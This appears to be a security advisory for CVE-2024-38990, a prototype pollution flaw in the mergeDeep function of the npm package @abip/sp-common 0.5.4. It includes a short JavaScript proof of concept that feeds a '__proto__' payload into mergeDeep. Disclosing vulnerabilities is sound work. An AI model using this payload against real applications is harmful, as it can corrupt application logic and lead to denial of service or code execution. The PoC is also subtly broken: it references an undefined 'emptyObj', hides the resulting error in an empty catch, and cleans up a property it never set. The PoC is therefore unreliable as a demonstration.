[CVE-2024-38990] Vulnerability Advisory: @abip/sp-common, version 0.5.4

 [Raw](/mestrtee/ae5f6b0d8f5d7de716e6af6d189b2169/raw/82815b2be8131146049949a95225ba21882d528a/Advisory_Tada5hi.md)

[**Advisory\_Tada5hi.md**](#file-advisory_tada5hi-md)

**Vulnerability type:**
Prototype Pollution

**CVSS Score**
6.3 MEDIUM

**Vendor of the Package:**
Tada5hi

**Affected Package:**

* Product: @abip/sp-common
* Version: 0.5.4

**Affected component(s):**

```
mergeDeep
```

**Attack vector(s):**
the attacker can modify built-in Object.prototype by calling the vulnerable function: `mergeDeep` with an argument containing a special property `__proto__` to pollute the application logic that can be escalated to Denial of service, remote code execution or cross-site scripting attacks.

**Description:**
Affected versions of this package are vulnerable to Prototype Pollution through the vulnerable function: `mergeDeep`. An attacker can alter the behavior of all objects inheriting from the affected prototype by passing arguments to the vulenrable function crafted with the built-in property: `__proto__`. The attack can potentially escalated to Denial of service, remote code execution or cross-site scripting attacks depends on the gadgets that may affected by the attack

**Proof-of-Concept:**

```
(async () => {
  const lib = await import('@abip/sp-common');

  var victim = {}

  console.log("Before Attack: ", JSON.stringify(victim.__proto__));

  try {

  lib.mergeDeep (emptyObj, JSON.parse('{"__proto__":{"test":123}}'))

  } catch (e) { }

  console.log("After Attack: ", JSON.stringify(victim.__proto__));

  delete Object.prototype.polluted;

  })();
```
